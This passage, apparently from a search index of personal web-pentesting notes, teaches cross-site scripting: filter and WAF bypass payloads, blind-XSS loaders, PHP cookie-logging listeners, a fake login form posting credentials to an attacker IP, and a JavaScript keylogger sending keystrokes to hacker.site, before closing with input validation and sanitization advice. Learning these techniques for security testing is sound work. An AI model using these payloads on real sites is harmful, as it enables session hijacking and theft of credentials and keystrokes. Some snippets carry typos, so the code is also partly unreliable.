XSS attack:</p> <pre><code>&lt;?php \n$file  = 'newcomers.log';\nif(@$_GET['name']){\n    $current = file_get_contents($file);\n    $current .= $_GET['name'].\"\\n\";\n    //store the newcomer\n    file_put_contents($file, $current);\n}\n//If admin show newcomers\nif(@$_GET['admin']==1)\n    echo file_get_contents($file);\n?&gt;\n\nWelcome &lt;?=$name?&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#3-dom-cross-site-scripting-type-0-or-local-xss","title":"3.  DOM Cross Site Scripting (Type-0 or Local XSS)","text":"OWASP reference <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.2. Testing for Stored Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 11.1 WSTG-CLNT-01 Testing for DOM-Based Cross Site Scripting - Identify DOM sinks.  - Build payloads that pertain to every sink type. <p>The key in exploiting this XSS flaw is that the client-side script code can access the browser's DOM, thus all the information available in it. Examples of this information are the URL, history, cookies, local storage,...  Technically there are two keywords: sources and sinks. Let's use the following vulnerable code:</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#causes_2","title":"Causes","text":"<p>This vulnerable code in a welcome page may lead to a DOM XSS attack: http://example.com/#w!Giuseppe</p> <pre><code>&lt;h1 id='welcome'&gt;&lt;/h1&gt;\n&lt;script&gt;\n    var w = \"Welcome\";\n    var name = document.location.hash.search(/#W!1)+3,\n                document.location.hash.length\n                );\n    document.getElementById('Welcome').innerHTML = w + name;\n&lt;/script&gt;\n</code></pre> <p>location.hash is the source of the untrusted input. .innerHTML is the sink where the input is used.</p> <p>To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.</p> <p>The most common source for DOM XSS is the URL, which is typically accessed with the\u00a0<code>window.location</code>\u00a0object.</p> <p>What is a sink? A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the\u00a0<code>eval()</code>\u00a0function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is\u00a0<code>document.body.innerHTML</code>\u00a0because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.</p> <p>Summing up: you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.</p> <p>Which sinks can lead to DOM-XSS vulnerabilities:</p> <ul> <li>document.write()</li> <li>document.writeln() </li> <li>document.replace()</li> <li>document.domain </li> <li>element.innerHTML </li> <li>element.outerHTML </li> <li>element.insertAdjacentHTML </li> <li>element.onevent</li> </ul> <p>Furthermore, some of the\u00a0<code>jQuery</code>\u00a0library functions that write to DOM objects are:</p> <ul> <li><code>add()</code></li> <li><code>after()</code></li> <li><code>append()</code></li> </ul> <p>This project, DOMXSS wiki aims to identify sources and sinks methods exposed by public, widely used javascript frameworks.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#4-universal-xss-uxss","title":"4. Universal XSS (UXSS)","text":"<p>Universal XSS is a particular type of Cross Site Scripting that does not leverage the flaws against web application, but the browser, its extensions or its plugins. A typical example for this could be found within the Google Chrome WordReference Extension, that did not properly sanitized the input of the search.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#attack-techniques","title":"Attack techniques","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#quick-steps-to-test-xss","title":"Quick steps to test XSS","text":"<p>1. Detect input vectors. Find a reflection point for a given input entry. This is tricky, since sometimes the entered value is reflected on a different part of the application.</p> <p>2. Check impact. Once identified the reflection point, inspect source code and recursively expand all tags to make sure that it's really a reflection point and it's not parsing your input.  This is also tricky, but there are techniques as encoding and double encoding that will allow us to bypass some XSS filters.</p> <p>3. Classify correctly what your injection point is like. Are you injecting raw HTML directly or a  HTML tag? Are you injecting a tag attribute value? Are you injecting into the javascript code? Where in the DOM are you operating? Is there a WAF tampering your input? Answering these questions is the same of knowing what characters you are needing to escape. </p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#1-bypassing-xss-filters","title":"1. Bypassing XSS filters","text":"<p>Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#11-injecting-inside-raw-html","title":"1.1. Injecting inside raw HTML","text":"<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;img src=x onerror=alert(1) /&gt;\n&lt;svg onload=alert('XSS')&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#12-injecting-into-html-tags","title":"1.2. Injecting into HTML tags","text":"<p>Firstly, some common escaping characters that may be parsed (and you need to further investigate to see how the application is treating them) are: </p> <ul> <li><code>&gt;</code>\u00a0(greater than)</li> <li><code>&lt;</code>\u00a0(less than)</li> <li><code>&amp;</code>\u00a0(ampersand)</li> <li><code>'</code>\u00a0(apostrophe or single quote)</li> <li><code>\"</code>\u00a0(double quote)</li> </ul> <p>Additionally, there might exist a filter for the characters <code>script</code>. Being that the case: </p> <p>1. Insert unexpected variations in the syntax such as random capitalization, blank spaces, new lines...: </p> <pre><code>\"&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;\n\"&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;\n</code></pre> <p>2. Bypass non-recursive filtering:</p> <pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(documInjecting into HTML tagsent.cookie)&lt;/script&gt;\n</code></pre> <p>3. Bypass encoding.</p> <pre><code># Simple encoding\n\"%3cscript%3ealert(document.cookie)%3c/script%3e\n\n# More encoding techniques: \n# 1. We lookk for a charcode calculator and enter our payload, for instance \"lala\" would be: 34, 108, 97, 108, 97, 34\n# 2. Them we put those numbers in our payload\n&lt;script&gt;alert(String.fromCharCode(34, 108, 97, 108, 97, 34))&lt;/script&gt;\n</code></pre> <p>Double encoding is very effective. I've run into cases in the wild.</p> <p>4. Unexpected parent tags:</p> <pre><code>&lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt;\n</code></pre> <p>5. Unexpected weird attributes, null bytes:</p> <pre><code>&lt;script x&gt;\n&lt;script a=\"1234\"&gt;\n&lt;script ~~~&gt;\n&lt;script/random&gt;alert(1)&lt;/script&gt;\n&lt;script ///Note the newline\n&gt;alert(1)&lt;/script&gt;\n&lt;scr\\x00ipt&gt;alert(1)&lt;/scr\\x00ipt&gt;\n</code></pre> <p>More. If the <code>script</code>tag is super blacklisted in all their forms, use other tags:</p> <pre><code>&lt;img&gt; ... &lt;IMG&gt;\n&lt;iframe&gt;\n&lt;input&gt;\n</code></pre> <p>Or even, make out your own:</p> <pre><code>&lt;lalala&gt; \n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#13-injecting-into-html-attributes","title":"1.3. Injecting into HTML attributes","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#a-id","title":"a) id","text":"<p>For instance, this injection endpoint (INJ):</p> <pre><code>&lt;div id=\"INJ\"&gt;\n</code></pre> <p>A payload for grabbing the cookies and have them sent to our attacker server would be:</p> <pre><code>x\" onmouseover=\"new Image().src=\"https://attacker.site/c.php?cc='+escape(document.cookie)\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#b-href","title":"b) href","text":"<p>For instance, this injection endpoint (INJ):</p> <pre><code>&lt;a href=\"victim.site/#INJ\"&gt;\n</code></pre> <p>A payload for grabbing the cookies and have them sent to our attacker server would be:</p> <pre><code>x\" onmouseover=\"new Image().src=\"https://attacker.site/c.php?cc='+escape(document.cookie)\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#c-height","title":"c) height","text":"<p>For instance, this injection endpoint (INJ):</p> <pre><code>&lt;video  width=\"320\" height=\"INJ\"&gt;\n</code></pre> <p>A payload for grabbing the cookies and have them sent to our attacker server would be:</p> <pre><code>240\" src=x onerror=\"new Audio().src=\"https://attacker.site/c.php?cc='+escape(document.cookie)\n</code></pre> <p>1. One nice technique is using non-common javascript events.</p> <pre><code># The usual payloads contains these events:\nalert()\nconfirm()\nprompt()\n\n# Try others:\nonload()\nonerror()\nonmousehover\n...\n</code></pre> <p>See complete reference at: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p> <p>2. Sometimes the events are filtered. This is a very common regex for filtering:</p> <pre><code>(on\\w+\\s*=)\n</code></pre> <p>Bypassing it:</p> <pre><code>&lt;svg/onload=alert(1)&gt;\n&lt;svg//////onload=alert(1)&gt;\n&lt;svg id=x;onload=alert(1)&gt;\n&lt;svg id='x'onload=alert(1)&gt;\n</code></pre> <p>3. Bettering up the filter:</p> <pre><code>(?i)([\\s\\\"'`;\\/0-9\\=]+on\\w+\\s*=)\n</code></pre> <p>Bypassing it:</p> <pre><code>&lt;svg onload%09=alert(1)&gt;\n&lt;svg %09onload=alert(1)&gt;\n&lt;svg %09onload%09=alert(1)&gt;\n&lt;svg onload%09%20%28%2c%3B=alert(1)&gt;\n&lt;svg onload%0B=alert(1)&gt;\n</code></pre> <p></p> <p>https://shazzer.co.uk/vectors is a great resource to see potential attack vectors. </p> <p></p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#14-going-beyond-the-scripttag","title":"1.4. Going beyond the <code>&lt;script&gt;</code>tag","text":"<pre><code>&lt;a href=\"javascript:alert(1)\"&gt;click&lt;/a&gt;\n&lt;a href=\"data:text/html;base64,amF2YXNjcmlwdDphbGVyKDEp\"&gt;click&lt;/a&gt;\n&lt;form action=\"javascript:alert(1)\"&gt;&lt;button&gt;send&lt;/button&gt;&lt;/form&gt;\n\n&lt;form id=x&gt;&lt;/form&gt;&lt;button form=\"x\" formaction=\"javascript:alert(1)\"&gt;send&lt;/button&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#15-bypassing-browsers-limitations","title":"1.5. Bypassing browser's limitations","text":"<p>One such XSS payload is\u00a0<code>&lt;plaintext&gt;</code>, which will stop rendering the HTML code that comes after it and display it as plaintext.  \u00a0 \u00a0Another easy-to-spot payload is\u00a0<code>&lt;script&gt;print()&lt;/script&gt;</code>\u00a0that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#16-blind-xss-hijacking","title":"1.6.  Blind XSS: hijacking","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#step-1","title":"Step 1","text":"<p>A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). </p> <p>1. Find the injection point. For that imaging a form with fields name, surname, username, profilepicture.... </p> <p>2. Find a payload that works. For that, have in the attacker server the following file index.php:</p> <pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>3. Have a php server listening:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <p>4. Use the field name (username, name, surname...) as <code>&lt;custom.name&gt;</code> when trying these payloads:</p> <pre><code>\"&gt;&lt;script src=\"https://attackerip/&lt;custom.name&gt;\"&gt;&lt;/script&gt;\n&lt;script src=\"https://attackerip/&lt;custom.name&gt;\"&gt;&lt;/script&gt;\n&lt;script src=http://attackerip/&lt;custom.name&gt;&gt;&lt;/script&gt;\n'&gt;&lt;script src=http://attackerip/&lt;custom.name&gt;&gt;&lt;/script&gt;\n\"&gt;&lt;script src=http://attackerip/&lt;custom.name&gt;&gt;&lt;/script&gt;\njavascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://attackerip\\';document.body.appendChild(a)')\n&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//attackerip\");a.send();&lt;/script&gt;\n&lt;script&gt;$.getScript(\"http://attackerip/&lt;custom.name&gt;\")&lt;/script&gt;\n</code></pre> <p>If successful, you will see a connection in your php server like this:</p> <p></p> <p>Then, <code>profile</code> would be the vulnerable parameter.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#step-2-exfiltrating-cookies","title":"Step 2: Exfiltrating cookies","text":"<p>1. Beside the index.php, have a lala.js in your php server:</p> <pre><code>new Image().src='http://attackerIP/index.php?c='+document.cookie\n</code></pre> <p>Another payload could be:</p> <pre><code>document.location='http://attackerIP/index.php?c='+document.cookie;\n</code></pre> <p>2. Run your php server:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <p>3. Now, we can change the URL in the XSS payload we found earlier to use\u00a0<code>lala.js</code>. For instance:</p> <pre><code>&lt;script src=http://attackerIP/lala.js&gt;&lt;/script&gt;\n</code></pre> <p>4. You will log the following activity in your php server:</p> <p></p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#2-bypassing-the-httponly-flag","title":"2. Bypassing the HTTPOnly flag","text":"<p>The  HTTPOnly flag can be enabled with the response header <code>Set-Cookie</code>:</p> <pre><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly\n</code></pre> <p>HTTPOnly forbids javaScript from accessing the cookies, for example, through the\u00a0<code>Document.cookie</code>\u00a0property.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#21-cross-site-tracing","title":"2.1. Cross Site Tracing","text":"<p>OWASP Cross Site Tracing reference</p> <p>Technique for bypassing HTTPOnly flag. Since scripting languages are blocked due to the use of HTTPOnly, this technique proposes to use the HTTP TRACE method.</p> <p>HTTP TRACE method is a method used for debugging, and it echoes back input requests to the user. So, if we send HTTP headers normally inaccessible to Javascript, we will be able to read them.</p> <p>We will take advantage of the javascript object <code>XMLHttpRequest</code>that provides a way to retrieve data from an URL without having to do a full page refresh:</p> <pre><code>&lt;script&gt; //TRACE Request\n    var xmlhttp = new XMLHttpRequest()M\n    var url = 'http://victim.site/';\n    xmlhttp.withCredentials = true; // Send cookie header\n    xmlhttp.open('TRACE', url);\n\n    // Callback to log all response headers\n    function hand() { console.log(this.getAllResponseHeaders());}\n    xmlhttp.onreadystatechange = hand;\n\n    xmlhttp.send(); // Send the request\n\n&lt;/script&gt;\n</code></pre> <p>Modern browsers block the HTTP TRACE method in XMLHttpRequest and other scripting languages and libraries such as JQuery, Silverlight... But if the attacker finds another way of doing HTTP TRACE requests, then they can bypass the HTTPOnly flag. </p> <p>For instance, Amit Klein found a simple trick for IE 6.0 SP2. Instead of using TRACE for the method, he used <code>\\r\\nTRACE</code>and the payload worked under certain circumstances.</p> <p>CVE-2012-0053: Apache HTTPOnly cookie disclosure. For Apache HTTP Server 2.2.x through 2.2.21. For an HTTP-Header value exceeding the server limits, the server responded with a HTTP 400 Bad Request including the complete headers containing the HTTPOnly cookies. (https://gist.github.com/pilate/1955a1c28324d4724b7b). BeEF has a module named Apache Cookie Disclosure, available under Exploits section.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#22-beef-tunneling-proxy","title":"2.2. BeEF Tunneling Proxy","text":"<p>An alternative to stealing protected cookies is to use the victim browser as a proxy. The Tunneling Proxy in BeEF exploits the XSS flaw and uses the victim browser to perform requests as the victim user to the web application. Basically, it tunnels requests through the hooked browser. By doing so, there is no way for the web application to distinguish between requests coming from legitimate user and requests forged by an atacker.  BeEF allows you to bypass other web developer protection techniques such as using multiple validations (User-agent, custom headers,...)</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#bypassing-wafs","title":"Bypassing WAFs","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#modsecurity","title":"ModSecurity","text":"<pre><code>&lt;svg onload='new Function`[\u201c_Y000!_\u201d].find(al\\u0065rt)`'&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#examples-of-typical-attacks","title":"Examples of typical attacks","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#1-cookie-stealing-examples-and-techniques","title":"1. Cookie stealing: examples and techniques","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#example-1","title":"Example 1","text":"<p>Identify an injection endpoint and test that the app is vulnerable to a basic xss payload such as:</p> <pre><code>&lt;script&gt;alert(\u2018lala\u2019)&lt;/script&gt;\n</code></pre> <p>Once you know is vulnerable, prepare a malicious javascript code for stealing the cookies:</p> <pre><code>&lt;script&gt;\nvar i = new Image();\ni.src = \"http://attacker.site/log.php?q=\"+document.cookie;\n&lt;/script&gt;\n</code></pre> <p>Add that code to the injection endpoint that you detected in step 1. That code will save the cookie in a text file on the attacker site.</p> <p>Create a text file (log.php) for capturing the sent cookie in the attacker site:</p> <pre><code>    &lt;?php\n        $filename=\u201d/tmp/log.txt\u201d;\n        $fp=fopen($filename, \u2018a\u2019);\n        $cookie=$_GET[\u2018q`];\n        fwrite($fp, $cookie);\n        fclose($fp);\n    ?&gt;\n</code></pre> <p>Open the listener in the attacker site and send the crafted URL with the payload included:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <p>Once someone open it, they will be sending to the attacker their cookies jar.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#example-2","title":"Example 2","text":"<ol> <li> <p>The attacker creates a get.php file and saves it into its server. </p> </li> <li> <p>This php file will store the data that the attacker server receives into a file.</p> </li> <li> <p>This could be the content of the get.php file:</p> </li> </ol> <pre><code>&lt;?php\n    $ip = $_SERVER(\u2018REMOTE_ADDR\u2019);\n    $browser = $_SERVER(\u2018HTTP_USER_AGENT\u2019);\n\n    $fp = fopen(\u2018jar.txt\u2019, \u2018a\u2019);\n\nfwrite($fp, $ip . \u2018 \u2018 . $browser . \u201c \\n\u201d);\nfwrite($fp, urldecode($_SERVER[\u2018QUERY_STRING\u2019]) . \u201c \\n\\n\u201d);\nfclose($fp);\n?&gt;\n</code></pre> <p>Initiate the php server in the attacker machine:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <ol> <li>Now in the web server the attacker achieve to store this payload:</li> </ol> <pre><code>&lt;script&gt;\nvar i = new Image();\ni.src = \u201chttp://attacker.site/get.php?cookie=\u201d+escape(document.cookie);\n&lt;/script&gt;\n\n# Or in one line:\n&lt;script&gt;var i = new Image(); i.src = \u201chttp://10.86.74.7/moville.php?cookie=\u201d+escape(document.cookie); &lt;/script&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#techniques-for-cookie-stealing","title":"Techniques for cookie stealing","text":"<p>Let's suppose we have our PHP script C.php listening on our hacker.site domain. </p> <p>Example of C.php Simple Listerner:</p> <pre><code># Instruct the script to simply store the GET['cc'] content in a file\n&lt;?php\nerror_reporting(0); # Turn off all error reporting\n$cookie= $_GET['cc']; # Request to log\n$file= '_cc_.txt'; # The log file\n$handle= fopen($file,\"a\"); # Open log file in append mode\nfwrite($handle,$cookie.\"\\n\"); # Append the cookie\nfclose($handle); # Append the cookie\n\necho '&lt;h1&gt;Page under construction&lt;/h1&gt;'; # Trying to hide suspects.\n</code></pre> <p>Example of C.php Listerner recording hosts, time of logging, IP addresses:</p> <pre><code># Instruct the script to simply store the GET['cc'] content in a file\n&lt;?php\nerror_reporting(0); # Turn off all error reporting\n\nfunction getVictimIP()= { ... } # Function that returns victim IP\nfunction collect() {\n$file= '_cc_.txt'; # The log file\n$date=date(\"l dS of F Y h:i:s A\");\n$IP=getVictimIP();\n$cookie= $_SERVER['QUERY_STRING'];\n\n$log=\"[$date]\\n\\t&gt; VictimIP: $IP\\n\\t&gt; Cookies: $cookie\\n\\t&gt; Extra info: $info\\n\";\n$handle= fopen($file,\"a\"); # Open log file in append mode\nfwrite($handle,$log.\"\\n\\b\"); # Append the cookie\nfclose($handle); # Append the cookie\n}\ncollect();\necho '&lt;h1&gt;Page under construction&lt;/h1&gt;'; # Trying to hide suspects.\n</code></pre> <p>Additionally we can use: netcat, Beef,...</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#2-dom-based-attack-incorrect-use-of-eval","title":"2. DOM based attack: incorrect use of eval()","text":"<p>In the following website we can see the code below:</p> <p></p> <p>And in the source code we can pinpoint this script:</p> <pre><code>&lt;script&gt;\n    var statement = document.URL.split(\"statement=\")[1];\n    document.getElementById(\"result\").innerHTML = eval(statement);\n&lt;/script&gt;\n</code></pre> <p>This JavaScript code is responsible for calculating and dynamically displaying the result of the arithmetic operation via the DOM splits the URL and parses the value of the\u00a0statement\u00a0parameter to the JavaScript\u00a0eval()\u00a0function for evaluation/calculation.</p> <p>The JavaScript\u00a0eval()\u00a0function is typically used by developers to evaluate JavaScript code, however, in this case, it has been improperly implemented to evaluate/perform the arithmetic operation specified by the user.</p> <p>NOTE: The eval()\u00a0function should never be used to execute JavaScript code in the form of a string as it can be leveraged by attackers to perform arbitrary code execution.</p> <p>Given the improper implementation of the\u00a0eval()\u00a0function, we can inject our XSS payload as a value of the\u00a0statement\u00a0parameter and forces the\u00a0eval()\u00a0function to execute the JavaScript payload.</p> <p></p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#3-defacements","title":"3. Defacements","text":"<p>We may categorize defacements into two types: Non-persistent (Virtuals) and Persistent. </p> <ul> <li>Non-persistent defacements don't modify the content hosted on the target web application. They are basically abusing Reflected XSS.</li> </ul> <pre><code># Code\n&lt;?php $name = @$_GET['name']; ?&gt;\nWelcome &lt;?=$name?&gt;\n\n# URL\nhttps://victim.site/XSS/reflected.php?name=%3Cscript%3Edocument.body.innerHTML=%22%3Cimg%20src=%27http://hackersite/pwned.png%27%3E%22%3C/script%3E\n</code></pre> <ul> <li>Persistent defacements modify permanently the content hosted on the target web application. They are basically abusing Stored XSS.</li> </ul> <p>Tools for cloning a website</p> <p>Three HTML elements are usually utilized to change the main look of a web page:</p> <ul> <li>Background Color\u00a0<code>document.body.style.background</code></li> </ul> <pre><code>&lt;script&gt;document.body.style.background = \"#141d2b\"&lt;/script&gt;\n</code></pre> <ul> <li>Background\u00a0<code>document.body.background</code></li> </ul> <pre><code>&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;\n</code></pre> <ul> <li>Page Title\u00a0<code>document.title</code></li> </ul> <pre><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;\n</code></pre> <ul> <li>Page Text\u00a0<code>DOM.innerHTML</code></li> </ul> <pre><code>&lt;script&gt;document.getElementById(\"todo\").innerHTML = \"New Text\"&lt;/script&gt;\n\n&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = '&lt;center&gt;&lt;h1 style=\"color: white\"&gt;Cyber Security Training&lt;/h1&gt;&lt;p style=\"color: white\"&gt;by &lt;img src=\"https://academy.hackthebox.com/images/logo-htb.svg\" height=\"25px\" alt=\"HTB Academy\"&gt; &lt;/p&gt;&lt;/center&gt;'&lt;/script&gt;\n</code></pre> <p>Defacement with credential stealing: Consider this payload in a website.</p> <pre><code>\\`/'&lt;/script/--!&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.198&gt;    &lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;\n</code></pre> <p>Have a netcat listener ready for getting the creds that may be sent. \u00a0If any victim attempts to log in with the form, we will get their credentials.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#4-keyloggers","title":"4. Keyloggers","text":"<p>A tool: http_javascript_keylogger. See also my notes on that metasploit module.</p> <p>Event logger from BeEF.</p> <p>The following code:</p> <pre><code>var keys = \"\" //Where &gt; where to store the key strokes\ndocument.onkeypress = function(e) {\n    var get = windows.event ? event : eM\n    var key = get.keyCode ? get.keyCode : get.charCode;\n    key = String.fromCharCode(key);\n    keys += key;\n}\n\nwindow.setInterval(function()) {\n    if(keys != \"\") {\n        //HOW&gt; sends the key strokes via GET using an Image element to listening hacker.site server\n        var path = encodeURI(\"http://hacker.site/keylogger?k=\" + keys);\n        new Image().src = path;\n        keys = \"\";\n\n    }\n}, 1000; // WHEN &gt; sends the key strokes every second\n</code></pre> <p>Additionally, we have the metasploit module auxiliary(http_javascript_keylogger), an advance version of the previous javascript code. It creates the Javascript payload with a keylogger, which could be injected within the vulnerable web page and automatically starts the listening server. To see how it works, set the DEMO option to true.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#5-network-attacks","title":"5. Network attacks","text":"<p>A way to enter within intranet networks is by passing through HTTP traffic that, despite other protocols, is usually allowed to pass by firewalls.</p> <p>1. IP detection</p> <p>The first step before putting your feet in a network is to retrieve as much network information as possible about the hooked browser. For instance by revealing its internal IP address and subnet.</p> <p>Traditionally, this required the use of external browser's pluggins such as Java JRE and some interaction from the victim:  - Installing My Address Java Applet:  Unsigned java applet that retrieves IP.  - Changing the java security settings enabling or reducing the security level).</p> <p>Use of https://net.ipcalf.com/ , that abuses WebRTC HTML5 feature.</p> <p>2. Subnet detection</p> <p>3. Ping Sweeping</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#6-bypassing-restrictions-in-frameset-tag","title":"6. Bypassing restrictions in frameset tag","text":"<p>See https://www.doyler.net/security-not-included/frameset-xss.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#7-blind-xss","title":"7. Blind XSS","text":"<p>A  Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:</p> <ul> <li>Contact Forms</li> <li>Reviews</li> <li>User Details</li> <li>Support Tickets</li> <li>HTTP User-Agent header</li> </ul> <p>Some payloads:</p> <pre><code>&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n\"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\njavascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://OUR_IP\\';document.body.appendChild(a)')\n&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//OUR_IP\");a.send();&lt;/script&gt;\n&lt;script&gt;$.getScript(\"http://OUR_IP\")&lt;/script&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#mitigations-for-cookie-stealing","title":"Mitigations for cookie stealing","text":"<p>The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end. In addition to that, other security measures can be taken to help prevent XSS attacks.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#1-input-validation","title":"1. Input validation","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#frontend-side-protection","title":"Frontend-side protection","text":"<p>As example, the following code validate the email input field  frontend-side.</p> <pre><code>function validateEmail(email) {\n    const re = /^(([^&lt;&gt;()[\\]\\\\.,;:\\s@\\\"]+(\\.[^&lt;&gt;()[\\]\\\\.,;:\\s@\\\"]+)*)|(\\\".+\\\"))@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\])|(([a-zA-Z\\-0-9]+\\.)+[a-zA-Z]{2,}))$/;\n    return re.test($(\"#login input[name=email]\").val());\n}\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#backend-side-protection","title":"Backend-side protection","text":"<p>Input validation in the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the back-end server will reject it and not display it.</p> <pre><code>if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {\n    // do task\n} else {\n    // reject input - do not display it\n}\n</code></pre> <p>For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#2-input-sanitization","title":"2. Input sanitization","text":"","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#frontend-side-protection_1","title":"Frontend-side protection","text":"<p>We should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the\u00a0DOMPurify\u00a0JavaScript library, as follows:</p> <pre><code>&lt;script type=\"text/javascript\" src=\"dist/purify.min.js\"&gt;&lt;/script&gt;\nlet clean = DOMPurify.sanitize( dirty );\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#backend-side-protection_1","title":"Backend-side protection","text":"<p>When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom\u00a0<code>GET</code>\u00a0or\u00a0<code>POST</code>\u00a0requests. For example, 